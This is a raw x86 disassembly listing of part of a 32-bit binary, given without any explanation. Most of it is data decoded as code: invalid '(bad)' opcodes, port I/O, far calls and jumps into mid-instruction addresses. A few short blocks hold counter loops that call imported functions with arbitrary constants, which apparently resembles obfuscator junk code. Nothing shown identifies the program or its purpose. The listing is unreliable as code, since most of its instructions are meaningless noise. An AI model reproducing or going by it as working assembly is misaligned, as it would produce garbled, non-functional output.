  40a1a3:	outs   dx,DWORD PTR ds:[esi]
  40a1a4:	cli    
  40a1a5:	stc    
  40a1a6:	(bad)  
  40a1a7:	mov    ecx,DWORD PTR [edx+0x11]
  40a1aa:	lea    esp,[edx+edx*1-0x79]
  40a1ae:	or     ch,dh
  40a1b0:	popf   
  40a1b1:	scas   al,BYTE PTR es:[edi]
  40a1b2:	sbb    al,0xa1
  40a1b4:	cmp    eax,0x6fa88532
  40a1b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a1ba:	sub    bl,BYTE PTR [esi]
  40a1bc:	adc    DWORD PTR [ecx-0x13df756b],esp
  40a1c2:	xchg   ebx,eax
  40a1c3:	lar    ecx,WORD PTR [ebx+0x2632e958]
  40a1ca:	stos   DWORD PTR es:[edi],eax
  40a1cb:	pop    ebp
  40a1cc:	and    BYTE PTR [esi],dl
  40a1ce:	jl     0x40a24e
  40a1d0:	loope  0x40a223
  40a1d2:	push   es
  40a1d3:	push   ecx
  40a1d4:	adc    eax,0xe301593f
  40a1d9:	sbb    bh,BYTE PTR [edx-0x159fb935]
  40a1df:	enter  0x5563,0xaf
  40a1e3:	xchg   DWORD PTR [eax+0x3bdf575a],esi
  40a1e9:	mov    ebx,0x1a2a7985
  40a1ee:	xor    al,0xa9
  40a1f0:	out    0xad,al
  40a1f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a1f3:	(bad)  
  40a1f4:	sbb    eax,0x5cf2e065
  40a1f9:	mov    dh,0x7e
  40a1fb:	mov    dh,0xe0
  40a1fd:	and    eax,0xa733817d
  40a202:	arpl   WORD PTR [ecx],di
  40a204:	cmp    al,0xb9
  40a206:	push   bx
  40a208:	mov    ah,0x3f
  40a20a:	mov    ds:0x8fa9e90e,al
  40a20f:	jmp    0x6fddc7d
  40a214:	cmp    BYTE PTR [ebx+eax*1],al
  40a217:	jecxz  0x40a1ad
  40a219:	adc    bh,cl
  40a21b:	cmp    eax,0x29bfc196
  40a220:	mov    eax,ds:0x211c23cb
  40a225:	mov    bl,0xd
  40a227:	mov    ch,BYTE PTR [edx+0x1192f9c2]
  40a22d:	out    dx,al
  40a22e:	mov    DWORD PTR [ebp-0x4],0xf89c85d1
  40a235:	mov    DWORD PTR [ebp-0x28],0xf89c8533
  40a23c:	adc    edx,edx
  40a23e:	mov    DWORD PTR [ebp-0x2c],0xf89c8532
  40a245:	and    DWORD PTR ds:0x42fced,0x0
  40a24f:	jmp    0x40a263
  40a254:	xor    edx,edx
  40a256:	or     edx,DWORD PTR ds:0x42fced
  40a25c:	inc    edx
  40a25d:	mov    DWORD PTR ds:0x42fced,edx
  40a263:	cmp    DWORD PTR ds:0x42fced,0x10
  40a26a:	jae    0x40a2a2
  40a270:	cmp    DWORD PTR ds:0x42fced,0x14
  40a277:	jne    0x40a297
  40a27d:	push   0x83c5
  40a282:	push   0x5a78
  40a287:	push   0x49ef
  40a28c:	push   0x22e4
  40a291:	call   DWORD PTR ds:0x42e2e7
  40a297:	jmp    0x40a254
  40a29c:	add    DWORD PTR ds:0x42e128,edx
  40a2a2:	mov    DWORD PTR [ebp-0x30],0xf89c853d
  40a2a9:	and    DWORD PTR ds:0x42e70f,0x7d59
  40a2b3:	jmp    0x40a671
  40a2b8:	into   
  40a2b9:	iret   
  40a2ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a2bb:	cmp    esp,DWORD PTR [ebp+0x7cc97171]
  40a2c1:	sbb    bl,BYTE PTR [edi+0x2b]
  40a2c4:	test   ebx,0xf545ba8a
  40a2ca:	jo     0x40a33c
  40a2cc:	lahf   
  40a2cd:	jge    0x40a33f
  40a2cf:	jo     0x40a2f5
  40a2d1:	arpl   WORD PTR [edi-0x70598dbe],bp
  40a2d7:	pop    edx
  40a2d8:	dec    ebx
  40a2d9:	mov    dh,0xea
  40a2db:	add    edi,DWORD PTR [ebx+ebp*8]
  40a2de:	push   edi
  40a2df:	int    0xd1
  40a2e1:	cmp    dh,BYTE PTR [ebx+edi*8]
  40a2e4:	or     eax,0x30d45f48
  40a2e9:	and    BYTE PTR [eax+0x48],ah
  40a2ec:	sub    DWORD PTR [eax],eax
  40a2ee:	stos   DWORD PTR es:[edi],eax
  40a2ef:	shl    BYTE PTR [edi+eax*4],cl
  40a2f2:	xor    al,0x7
  40a2f4:	mov    edi,0x1ff94d59
  40a2f9:	fcmovnb st,st(1)
  40a2fb:	sbb    edx,0x3a
  40a2fe:	mov    bh,0xb3
  40a300:	mov    ch,BYTE PTR [eax-0x557ad6cd]
  40a306:	rcl    DWORD PTR [ecx+0x6d],0x8e
  40a30a:	mov    esp,0xb803e43e
  40a30f:	jecxz  0x40a307
  40a311:	stos   DWORD PTR es:[edi],eax
  40a312:	dec    edi
  40a313:	repz adc edx,esp
  40a316:	ds fs ret 
  40a319:	or     al,0x20
  40a31b:	fldcw  WORD PTR [edi]
  40a31d:	out    dx,eax
  40a31e:	scas   al,BYTE PTR es:[edi]
  40a31f:	add    al,0xbd
  40a321:	popa   
  40a322:	mov    al,0x21
  40a324:	and    DWORD PTR [eax+0x2433eb30],ebx
  40a32a:	pop    ecx
  40a32b:	iret   
  40a32c:	mov    ecx,DWORD PTR [edx+0x3]
  40a32f:	(bad)  
  40a330:	lods   eax,DWORD PTR ds:[esi]
  40a331:	jne    0x40a38f
  40a333:	add    al,BYTE PTR [ebp+edx*1+0x2e960e17]
  40a33a:	jg     0x40a306
  40a33c:	xchg   edx,eax
  40a33d:	dec    edx
  40a33e:	fadd   DWORD PTR [eax+eax*4+0x63]
  40a342:	or     eax,0xde398f36
  40a347:	inc    eax
  40a348:	sub    esi,esi
  40a34a:	mov    ds:0xed49ef42,al
  40a34f:	mov    ch,0x7e
  40a351:	pusha  
  40a352:	loop   0x40a31f
  40a354:	int3   
  40a355:	mov    bh,cl
  40a357:	xchg   esp,eax
  40a358:	popa   
  40a359:	adc    dl,bh
  40a35b:	sbb    DWORD PTR [esi],edx
  40a35d:	fsubr  DWORD PTR [eax+eax*2]
  40a360:	pushf  
  40a361:	pop    eax
  40a362:	xchg   esi,eax
  40a363:	(bad)  
  40a364:	push   eax
  40a365:	add    al,bh
  40a367:	das    
  40a368:	mov    edx,0xba70d1de
  40a36d:	and    al,0xc3
  40a36f:	jge    0x40a30b
  40a371:	ror    eax,0x1
  40a374:	(bad)  
  40a375:	xlat   BYTE PTR ds:[ebx]
  40a377:	inc    ebx
  40a378:	cmp    bl,cl
  40a37a:	enter  0x5374,0xf7
  40a37e:	jb     0x40a3b6
  40a380:	cdq    
  40a381:	cld    
  40a382:	and    DWORD PTR [ebx],0x8e240fe3
  40a388:	mov    ebp,0x61089547
  40a38d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a38e:	in     al,dx
  40a38f:	sbb    BYTE PTR [ebx+0x60],ch
  40a392:	in     al,dx
  40a393:	cmp    eax,0xcf02e6ac
  40a398:	stos   BYTE PTR es:[edi],al
  40a399:	popa   
  40a39a:	out    0xa8,eax
  40a39c:	pop    esi
  40a39d:	mov    ecx,0x9fe52e9b
  40a3a2:	enter  0xadba,0xdf
  40a3a6:	mov    edi,0xe10e7a61
  40a3ab:	push   edx
  40a3ac:	and    ch,BYTE PTR [edi-0x63]
  40a3af:	jnp    0x40a3b7
  40a3b1:	shl    BYTE PTR [ecx+0x64],cl
  40a3b4:	push   eax
  40a3b5:	nop
  40a3b6:	inc    edx
  40a3b7:	les    ebx,FWORD PTR [ecx+edi*2-0x52231c03]
  40a3be:	pop    esp
  40a3bf:	pop    ss
  40a3c0:	(bad)  
  40a3c1:	scas   eax,DWORD PTR es:[edi]
  40a3c2:	loopne 0x40a3a3
  40a3c4:	lock jecxz 0x40a41b
  40a3c7:	outs   dx,DWORD PTR ds:[esi]
  40a3c8:	sbb    edi,DWORD PTR [ecx]
  40a3ca:	dec    esi
  40a3cb:	cmc    
  40a3cc:	adc    eax,0x65e034df
  40a3d1:	pop    esp
  40a3d2:	dec    BYTE PTR [edi-0x4]
  40a3d5:	push   ecx
  40a3d6:	mov    ecx,0xf7ca438a
  40a3db:	mov    eax,ds:0xf46ac5d9
  40a3e0:	out    0xb3,eax
  40a3e2:	sub    ebx,edi
  40a3e4:	das    
  40a3e5:	or     eax,0xd1103d78
  40a3ea:	mov    dl,0x70
  40a3ec:	inc    esp
  40a3ed:	in     al,dx
  40a3ee:	jmp    0x40a3e5
  40a3f0:	xlat   BYTE PTR ds:[ebx]
  40a3f1:	fcomp  QWORD PTR [ebx+eax*8-0x72]
  40a3f5:	fucomip st,st(0)
  40a3f7:	imul   esp,DWORD PTR [ecx-0x78e155d8],0x91448089
  40a401:	adc    DWORD PTR [ecx+0x7d],0x3a
  40a405:	ror    DWORD PTR [ebx+0x6b59cd10],cl
  40a40b:	daa    
  40a40c:	cmc    
  40a40d:	inc    esi
  40a40e:	mov    eax,0x5040ea9c
  40a413:	imul   esp,edi,0x2ddb9736
  40a419:	popf   
  40a41a:	in     al,dx
  40a41b:	mov    edi,0x37d94604
  40a420:	imul   al
  40a422:	jns    0x40a40c
  40a424:	pop    es
  40a425:	pop    eax
  40a426:	mov    eax,0x3c434bb4
  40a42b:	inc    esi
  40a42c:	dec    ebp
  40a42d:	les    eax,FWORD PTR [ebp+0x3193deab]
  40a433:	cmp    al,0x31
  40a435:	and    al,BYTE PTR [ebp-0x2d]
  40a438:	mov    ecx,0x91247a21
  40a43d:	push   ebp
  40a43e:	je     0x40a40c
  40a440:	cmp    eax,0x10def9cc
  40a445:	lahf   
  40a446:	mov    esp,0x58fb47db
  40a44b:	jnp    0x40a44a
  40a44d:	repz test DWORD PTR [ebx+0x1b],ecx
  40a451:	retf   0x88b0
  40a454:	iret   
  40a455:	daa    
  40a456:	push   esp
  40a457:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a458:	mov    ecx,0xff46a0ab
  40a45d:	and    bl,BYTE PTR [ebx]
  40a45f:	xchg   ah,cl
  40a461:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a462:	cs popa 
  40a464:	xor    dl,BYTE PTR [ebp+edx*1-0x45c7e668]
  40a46b:	pop    es
  40a46c:	inc    ebp
  40a46d:	out    0x8,eax
  40a46f:	mov    bh,0xf5
  40a471:	shl    BYTE PTR [esi+0x1219dd47],0xa3
  40a478:	int    0xd6
  40a47a:	mov    ecx,DWORD PTR [ebx+0x9bccf90]
  40a480:	xor    esi,DWORD PTR [ebx+0x7e]
  40a483:	je     0x40a41e
  40a485:	xor    eax,DWORD PTR [edx+edi*2-0x39e38639]
  40a48c:	leave  
  40a48d:	mov    edx,ds
  40a48f:	xor    esp,DWORD PTR [edi+0x777a051]
  40a495:	sub    eax,0x20dcd613
  40a49a:	mov    ds:0x5b96f3d2,al
  40a49f:	mov    dl,0xcd
  40a4a1:	rol    BYTE PTR [edx-0x66],0x21
  40a4a5:	push   esp
  40a4a6:	cs popf 
  40a4a8:	aad    0x9c
  40a4aa:	mov    eax,0xea7534b4
  40a4af:	imul   eax,DWORD PTR [eax-0x4],0x44
  40a4b3:	mov    esp,0x6fec8b65
  40a4b8:	(bad)  
  40a4b9:	push   esi
  40a4ba:	push   0x9a5226b4
  40a4bf:	jmp    0x40a47b
  40a4c1:	in     eax,dx
  40a4c2:	arpl   WORD PTR [ecx+0x66ec3e64],si
  40a4c8:	add    bh,bh
  40a4ca:	(bad)  
  40a4cb:	push   ecx
  40a4cc:	hlt    
  40a4cd:	sbb    BYTE PTR [ebp+0x1ae954f9],dh
  40a4d3:	xchg   DWORD PTR [esi-0x38],ebx
  40a4d6:	mov    bh,0x61
  40a4d8:	and    al,0x35
  40a4da:	adc    BYTE PTR [ecx-0x50],0xed
  40a4de:	fwait
  40a4df:	aad    0x27
  40a4e1:	push   es
  40a4e2:	jmp    0xabd6253f
  40a4e7:	or     esi,esi
  40a4e9:	out    0x1e,al
  40a4eb:	mov    esi,0xec748de6
  40a4f0:	add    BYTE PTR [ecx-0x67],ch
  40a4f3:	outs   dx,BYTE PTR ds:[esi]
  40a4f4:	shl    DWORD PTR ss:[edi-0xa],1
  40a4f8:	sar    BYTE PTR [edx+0x3bf72b4],1
  40a4fe:	js     0x40a4e6
  40a500:	pop    edx
  40a501:	pushf  
  40a502:	das    
  40a503:	add    al,0xc5
  40a505:	mov    dl,BYTE PTR [edx-0x79]
  40a508:	not    bl
  40a50a:	retf   
  40a50b:	call   0x7523:0xbce1e3d4
  40a512:	sbb    bl,BYTE PTR [edi+0x72f32e96]
  40a518:	outs   dx,DWORD PTR ds:[esi]
  40a519:	imul   DWORD PTR [eax]
  40a51b:	push   ebx
  40a51c:	and    DWORD PTR [edx+ebx*2],esp
  40a51f:	mov    dh,0x9d
  40a521:	rcr    DWORD PTR ds:0x826906c0,1
  40a527:	fidivr DWORD PTR [edx-0x21]
  40a52a:	(bad)  
  40a52b:	sbb    bh,dl
  40a52d:	xor    esp,DWORD PTR [ebx]
  40a52f:	std    
  40a530:	jbe    0x40a4e6
  40a532:	retf   
  40a533:	out    dx,eax
  40a534:	arpl   di,dx
  40a536:	jbe    0x40a559
  40a538:	inc    ebp
  40a539:	test   al,0xf2
  40a53b:	test   eax,0x6ae0d1ac
  40a540:	or     ah,dh
  40a542:	aaa    
  40a543:	xchg   ch,dl
  40a545:	mov    al,ds:0x14acc2d0
  40a54a:	inc    eax
  40a54b:	dec    edi
  40a54c:	mov    bl,BYTE PTR [bx+0x24]
  40a550:	loopne 0x40a54b
  40a552:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a553:	push   edx
  40a554:	jg     0x40a57b
  40a556:	ins    BYTE PTR es:[edi],dx
  40a557:	lods   al,BYTE PTR ds:[esi]
  40a558:	push   0x8d936a00
  40a55d:	(bad)  
  40a55e:	rcr    ecx,1
  40a560:	push   ebp
  40a561:	ins    BYTE PTR es:[edi],dx
  40a562:	jle    0x40a581
  40a564:	mov    dl,0xd5
  40a566:	pop    ebp
  40a567:	ficom  DWORD PTR [edi+ebx*4-0x39]
  40a56b:	sti    
  40a56c:	retf   
  40a56d:	inc    eax
  40a56e:	xchg   edi,eax
  40a56f:	retf   
  40a570:	xor    al,0xb7
  40a572:	(bad)  
  40a573:	mov    al,ds:0x72e3f601
  40a578:	pop    edx
  40a579:	push   ds
  40a57a:	gs or  al,0xbd
  40a57d:	int    0x5a
  40a57f:	enter  0x58ec,0xad
  40a583:	popf   
  40a584:	mov    ds:0xad6c70b3,eax
  40a589:	aam    0xb4
  40a58b:	xor    ah,BYTE PTR [esi+edx*1]
  40a58e:	aaa    
  40a58f:	or     BYTE PTR [esi+eiz*2-0x74],cl
  40a593:	pop    ecx
  40a594:	cmp    al,0xbe
  40a596:	xchg   esp,eax
  40a597:	int    0xf0
  40a599:	out    0x37,al
  40a59b:	es repz fdiv st,st(1)
  40a59f:	nop
  40a5a0:	push   ecx
  40a5a1:	stc    
  40a5a2:	call   0x28fb:0xf285b595
  40a5a9:	mov    esp,DWORD PTR ds:0xea933b63
  40a5af:	xor    BYTE PTR ds:0xd8c21151,bh
  40a5b5:	gs push cs
  40a5b7:	pop    edx
  40a5b8:	lahf   
  40a5b9:	or     eax,0xdd6e7fdd
  40a5be:	jae    0x40a5b3
  40a5c0:	xchg   DWORD PTR [ecx],esp
  40a5c2:	es cmp eax,0x9486f5c3
  40a5c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a5c9:	test   DWORD PTR [ecx-0x43],edx
  40a5cc:	int3   
  40a5cd:	fimul  WORD PTR [eax+0x10]
  40a5d0:	xchg   DWORD PTR [ecx-0x20],ebx
  40a5d3:	imul   ebx,DWORD PTR [edi],0x1bdd149c
  40a5d9:	and    DWORD PTR [edi+0x25ee8386],esi
  40a5df:	out    dx,eax
  40a5e0:	retf   
  40a5e1:	pop    edi
  40a5e2:	dec    edx
  40a5e3:	pop    edi
  40a5e4:	cwde   
  40a5e5:	popa   
  40a5e6:	iret   
  40a5e7:	sbb    BYTE PTR [ebp-0xc],bl
  40a5ea:	in     eax,0x89
  40a5ec:	mov    esp,0x50ce9d89
  40a5f1:	dec    edx
  40a5f2:	sahf   
  40a5f3:	imul   ecx,ebp,0xffffffa9
  40a5f6:	xchg   ebp,eax
  40a5f7:	xchg   DWORD PTR [si],ebp
  40a5fa:	dec    ebp
  40a5fb:	and    al,dh
  40a5fd:	pop    ds
  40a5fe:	scas   al,BYTE PTR es:[edi]
  40a5ff:	lods   eax,DWORD PTR ds:[esi]
  40a600:	xor    BYTE PTR [esi-0x41ccf9f2],cl
  40a606:	jge    0x40a61c
  40a608:	inc    BYTE PTR [edx-0x74]
  40a60b:	cmp    BYTE PTR [esi],bl
  40a60d:	(bad)  
  40a60f:	mov    BYTE PTR [esi],dl
  40a611:	xor    eax,0x3f24632d
  40a616:	cwde   
  40a617:	or     DWORD PTR [ebp+ebp*8+0x7a3fa8e8],edx
  40a61e:	jae    0x40a608
  40a620:	lods   al,BYTE PTR ds:[esi]
  40a621:	jl     0x40a671
  40a623:	hlt    
  40a624:	unpcklps xmm5,xmm5
  40a627:	(bad)  
  40a628:	mov    ds:0x6ee08170,al
  40a62d:	out    0xb9,al
  40a62f:	nop
  40a630:	(bad)  
  40a631:	mov    ecx,0x98209e8
  40a636:	scas   al,BYTE PTR es:[edi]
  40a637:	mov    bh,0x2e
  40a639:	add    ecx,DWORD PTR [eax]
  40a63b:	rcl    DWORD PTR [edi-0x268e13d0],1
  40a641:	or     BYTE PTR [esi+0x2],cl
  40a644:	jb     0x40a627
  40a646:	jbe    0x40a61e
  40a648:	xchg   ebx,eax
  40a649:	mov    dh,BYTE PTR [esp+eax*4]
  40a64c:	jnp    0x40a6a2
  40a64e:	repz adc al,0xf1
  40a651:	cmp    DWORD PTR [edx],edi
  40a653:	push   ebp
  40a654:	mov    cl,0xc5
  40a656:	outs   dx,BYTE PTR ds:[esi]
  40a657:	xchg   ebx,eax
  40a658:	mov    edx,0x1d54dcc2
  40a65d:	ds dec esi
  40a65f:	fdivr  DWORD PTR [ecx+0x12192fd2]
  40a665:	inc    esp
  40a666:	arpl   WORD PTR [esi],sp
  40a668:	jns    0x40a6ca
  40a66a:	sbb    esi,esi
  40a66c:	push   0x4e
  40a66e:	inc    edx
  40a66f:	aas    
  40a670:	lahf   
  40a671:	mov    DWORD PTR [ebp-0x34],0xf89c853c
  40a678:	mov    DWORD PTR [ebp-0x38],0xf89c853f
  40a67f:	and    DWORD PTR ds:0x42e6ef,0x0
  40a689:	xor    edx,edx
  40a68b:	or     edx,DWORD PTR ds:0x42e6ef
  40a691:	inc    edx
  40a692:	mov    DWORD PTR ds:0x42e6ef,edx
  40a698:	cmp    DWORD PTR ds:0x42e6ef,0xf
  40a69f:	jne    0x40a6c6
  40a6a5:	push   DWORD PTR [ebp-0x28]
  40a6a8:	push   DWORD PTR [ebp-0x10]
  40a6ab:	push   0x42e6f7
  40a6b0:	push   DWORD PTR [ebp-0x14]
  40a6b3:	push   DWORD PTR [ebp-0x18]
  40a6b6:	push   0x89bc
  40a6bb:	push   0x39f6
  40a6c0:	call   DWORD PTR ds:0x42e2eb
  40a6c6:	cmp    DWORD PTR ds:0x42e6ef,0xe
  40a6cd:	jne    0x40a6e0
  40a6d3:	mov    edx,DWORD PTR ds:0x42e6ef
  40a6d9:	inc    edx
  40a6da:	mov    DWORD PTR ds:0x42e6ef,edx
  40a6e0:	cmp    DWORD PTR ds:0x42e6ef,0x1c
  40a6e7:	jb     0x40a689
  40a6ed:	and    DWORD PTR ds:0x42fcdd,0x0
  40a6f7:	jmp    0x40a709
  40a6fc:	mov    edx,DWORD PTR ds:0x42fcdd
  40a702:	inc    edx
  40a703:	mov    DWORD PTR ds:0x42fcdd,edx
  40a709:	cmp    DWORD PTR ds:0x42fcdd,0x13
  40a710:	jae    0x40a766
  40a716:	cmp    DWORD PTR ds:0x42fcdd,0xb
  40a71d:	jne    0x40a733
  40a723:	push   0x42e26d
  40a728:	push   0x42e25b
  40a72d:	call   DWORD PTR ds:0x42e547
  40a733:	cmp    DWORD PTR ds:0x42fcdd,0xa
  40a73a:	jne    0x40a74f
  40a740:	xor    edx,edx
  40a742:	add    edx,DWORD PTR ds:0x42fcdd
  40a748:	inc    edx
  40a749:	mov    DWORD PTR ds:0x42fcdd,edx
  40a74f:	jmp    0x40a6fc
  40a754:	mov    edi,DWORD PTR ds:0x42e134
  40a75a:	xor    edi,DWORD PTR ds:0x42e713
  40a760:	mov    DWORD PTR ds:0x42e134,edi
  40a766:	mov    DWORD PTR [ebp-0x3c],0xf89c853e
  40a76d:	adc    DWORD PTR ds:0x42e713,edx
  40a773:	mov    edx,DWORD PTR [ebp+0x8]
  40a776:	xor    edx,eax
  40a778:	sub    edi,DWORD PTR ds:0x42fcd1
  40a77e:	mov    edi,DWORD PTR [ebp-0x10]
  40a781:	add    edx,ecx
  40a783:	mov    DWORD PTR ds:0x42fce5,0x29c7
  40a78d:	cmp    edi,edx
  40a78f:	mov    DWORD PTR ds:0x42e713,0x10c5
  40a799:	je     0x40d88b
  40a79f:	mov    DWORD PTR ds:0x42fcf9,0x41c2
  40a7a9:	push   ebx
  40a7aa:	mov    DWORD PTR ds:0x42fd09,0x2602
  40a7b4:	jmp    0x40d4a8
  40a7b9:	mov    edx,DWORD PTR [ebp-0x8]
  40a7bc:	mov    DWORD PTR ds:0x42e130,0x1c
  40a7c6:	cmp    DWORD PTR ds:0x42e130,0x0
  40a7cd:	je     0x40a824
  40a7d3:	cmp    DWORD PTR ds:0x42e130,0x7
  40a7da:	jne    0x40a7f8
  40a7e0:	push   DWORD PTR [ebp-0x10]
  40a7e3:	push   0x42e1e7
  40a7e8:	push   0x42e23d
  40a7ed:	push   0x42e23d
  40a7f2:	call   DWORD PTR ds:0x42e2ef
  40a7f8:	cmp    DWORD PTR ds:0x42e130,0x8
  40a7ff:	jne    0x40a812
  40a805:	mov    edi,DWORD PTR ds:0x42e130
  40a80b:	dec    edi
  40a80c:	mov    DWORD PTR ds:0x42e130,edi
  40a812:	mov    edi,DWORD PTR ds:0x42e130
  40a818:	dec    edi
  40a819:	mov    DWORD PTR ds:0x42e130,edi
  40a81f:	jmp    0x40a7c6
  40a824:	mov    edi,DWORD PTR [ebp-0x10]
  40a827:	xor    DWORD PTR ds:0x42e12c,0x3333
  40a831:	sub    edi,edx
  40a833:	mov    edx,DWORD PTR ds:0x42fd6e
  40a839:	add    DWORD PTR ds:0x42e707,edx
  40a83f:	mov    edx,DWORD PTR [ebp-0x4]
  40a842:	jmp    0x40ac00
  40a847:	addr16 sub al,0x5e
  40a84a:	xchg   esi,eax
  40a84b:	jno    0x40a89f
  40a84d:	ja     0x40a838
  40a84f:	dec    eax
  40a850:	(bad)  
  40a851:	in     al,dx
  40a852:	std    
  40a853:	jle    0x40a878
  40a855:	cmp    al,0x15
  40a857:	in     al,0xf1
  40a859:	jo     0x40a8cb
  40a85b:	lahf   
  40a85c:	jge    0x40a8ce
  40a85e:	jo     0x40a7f7
  40a860:	cmp    dh,al
  40a862:	add    DWORD PTR [eax+0x50],0xffffff9d
  40a866:	pusha  
  40a867:	cmc    
  40a868:	imul   ebp,ebp,0xcad06074
  40a86e:	stc    
  40a86f:	mov    esp,0xf3ae138b
  40a874:	mov    ch,ch
  40a876:	sub    DWORD PTR [ecx+0xe],eax
  40a879:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a87a:	mov    edi,0x6e16cc27
  40a87f:	or     al,0x31
  40a881:	adc    BYTE PTR [edi+eax*1],0x29
  40a885:	add    DWORD PTR [esi+0x23ab2dc4],edi
  40a88b:	pop    esi
  40a88c:	ret    0xf5d8
  40a88f:	jae    0x40a8b0
  40a891:	mov    BYTE PTR [edi+0x31],al
  40a894:	mov    ebx,0x346d7f01
  40a899:	inc    ebp
  40a89a:	jg     0x40a905
  40a89c:	in     al,dx
  40a89d:	adc    DWORD PTR [edi+ebp*1+0x38],ebx
  40a8a1:	and    esi,DWORD PTR [eax-0x6e5b8993]
  40a8a7:	ss in  eax,0xd4
  40a8aa:	add    edi,DWORD PTR ss:[ebx]
  40a8ad:	sub    eax,ebx
  40a8af:	mov    WORD PTR ds:0xba3fc6d2,es
  40a8b5:	sub    ebx,esi
  40a8b7:	adc    edx,eax
  40a8b9:	pop    ds
  40a8ba:	addr16 push 0xacff6a3f
  40a8c0:	jg     0x40a8a1
  40a8c2:	adc    eax,0x55fa7cdc
  40a8c7:	cdq    
  40a8c8:	or     al,BYTE PTR [ebx-0x711a57]
  40a8ce:	sub    al,0x62
  40a8d0:	xor    BYTE PTR [esi-0x12d069cd],al
  40a8d6:	push   ebx
  40a8d7:	daa    
  40a8d8:	loop   0x40a877
  40a8da:	add    eax,0xdcc6234f
  40a8df:	jl     0x40a887
  40a8e1:	mov    bl,0x8e
  40a8e3:	test   ebx,eax
  40a8e5:	lods   eax,DWORD PTR ds:[esi]
  40a8e6:	jne    0x40a95a
  40a8e8:	shr    BYTE PTR [eax-0x3a4ed57e],cl
  40a8ee:	and    BYTE PTR [eax-0x56],al
  40a8f1:	cmp    al,0x8a
  40a8f3:	out    0x54,eax
  40a8f5:	inc    ebp
  40a8f6:	xchg   edi,eax
  40a8f7:	push   ds
  40a8f8:	pop    ss
  40a8f9:	mov    cl,0x48
  40a8fb:	loopne 0x40a97b
  40a8fd:	xor    eax,0x693410f4
  40a902:	imul   ebx,DWORD PTR [edx],0x21
  40a905:	mul    DWORD PTR [ebp-0x63e08da]
  40a90b:	cld    
  40a90c:	inc    BYTE PTR [edx+0x414ab344]
  40a912:	jne    0x40a8f0
  40a914:	fsubr  st(1),st
  40a916:	out    0xe6,eax
  40a918:	es lock jnp 0x40a8cb
  40a91c:	sub    DWORD PTR [esi],esp
  40a91e:	stos   BYTE PTR es:[edi],al
  40a91f:	add    eax,0xcc108a12
  40a924:	push   edi
  40a925:	xchg   edx,eax
  40a926:	cmp    dh,BYTE PTR [eax+ebx*2]
  40a929:	and    edi,DWORD PTR [edi+0x12]
  40a92c:	mov    al,0x19
  40a92e:	scas   eax,DWORD PTR es:[edi]
  40a92f:	jl     0x40a971
  40a931:	pop    ebp
  40a932:	jle    0x40a947
  40a934:	(bad)  
  40a935:	and    al,0xdf
  40a937:	and    eax,DWORD PTR [esi-0x1c]
  40a93a:	push   es
  40a93b:	sbb    BYTE PTR [ecx],ah
  40a93d:	sub    DWORD PTR [eax+0x63],edi
  40a940:	fadd   DWORD PTR ds:0x45b02697
  40a946:	(bad)  
  40a947:	sbb    ebp,DWORD PTR [edx]
  40a949:	sti    
  40a94a:	mov    ecx,0x7c23b7ab
  40a94f:	daa    
  40a950:	outs   dx,BYTE PTR ds:[esi]
  40a951:	inc    edi
  40a952:	repnz add eax,0x3525d5fe
  40a958:	fisttp WORD PTR [ebx-0x66a5f827]
  40a95e:	jns    0x40a954
  40a960:	adc    dh,BYTE PTR [esp+edi*1-0x19]
  40a964:	stos   DWORD PTR es:[edi],eax
  40a965:	pop    es
  40a966:	iret   
  40a967:	sbb    eax,0x9465e40d
  40a96c:	sub    cl,dl
  40a96e:	adc    DWORD PTR [edx+0xaa00e79],esi
  40a974:	shl    DWORD PTR [edx+edi*4+0x31de2cea],cl
  40a97b:	cmp    ebx,DWORD PTR [edx-0x6]
  40a97e:	pop    esp
  40a97f:	sub    BYTE PTR [ecx-0x68e7004a],ah
  40a985:	inc    ecx
  40a986:	cmp    dl,BYTE PTR [ecx-0x68fee0a]
  40a98c:	sbb    al,0xe0
  40a98e:	pop    ebp
  40a98f:	hlt    
  40a990:	cld    
  40a991:	xor    al,0x3
  40a993:	xchg   esp,eax
  40a994:	mov    edx,0xcddec831
  40a999:	jle    0x40a926
  40a99b:	xor    eax,0xfb24cb1d
  40a9a0:	cmp    ax,0x4c76
  40a9a4:	xchg   esi,eax
  40a9a5:	inc    esp
  40a9a6:	fld    TBYTE PTR [ecx+0x3f45611c]
  40a9ac:	loope  0x40a9ae
  40a9ae:	mov    edx,0x14917cd8
  40a9b3:	cwde   
  40a9b4:	dec    eax
  40a9b5:	shl    ebx,1
  40a9b7:	dec    esp
  40a9b8:	adc    al,0x3e
  40a9ba:	test   eax,0x88dfbe86
  40a9bf:	push   eax
  40a9c0:	pop    ebx
  40a9c1:	pop    esi
  40a9c2:	mov    gs,WORD PTR [ecx-0x6794b590]
  40a9c8:	jbe    0x40a95f
  40a9ca:	gs retf 
  40a9cc:	xchg   edx,eax
  40a9cd:	xor    eax,0x2c7f6c4
  40a9d2:	and    edi,edi
  40a9d4:	cld    
  40a9d5:	dec    ebx
  40a9d6:	cs sbb esi,ebx
  40a9d9:	mov    al,ds:0xcb675ede
  40a9de:	or     esi,DWORD PTR [esi+0x617718a5]
  40a9e4:	pusha  
  40a9e5:	pop    ebx
  40a9e6:	or     BYTE PTR [edi-0x9e8a746],ch
  40a9ec:	jae    0x40aa14
  40a9ee:	arpl   WORD PTR [ecx+0x9403404],dx
  40a9f4:	pop    ebx
  40a9f5:	sbb    ebx,DWORD PTR [esi+0x40a4d330]
  40a9fb:	dec    esp
  40a9fc:	mov    edi,0x30533990
  40aa01:	cmp    esi,esi
  40aa03:	std    
  40aa04:	and    ebp,DWORD PTR [edx+0x44]
  40aa07:	adc    eax,0xaf0a5123
  40aa0c:	daa    
  40aa0d:	or     DWORD PTR [esi],edx
  40aa0f:	seto   BYTE PTR [edi+0xb]
  40aa13:	rcl    DWORD PTR [ecx-0x5b],1
  40aa16:	(bad)  
  40aa17:	int3   
  40aa18:	pop    ds
  40aa19:	mov    ebp,0xe9c4f1ea
  40aa1e:	cwde   
  40aa1f:	les    ebp,FWORD PTR [ecx+0x7c]
  40aa22:	in     al,0x11
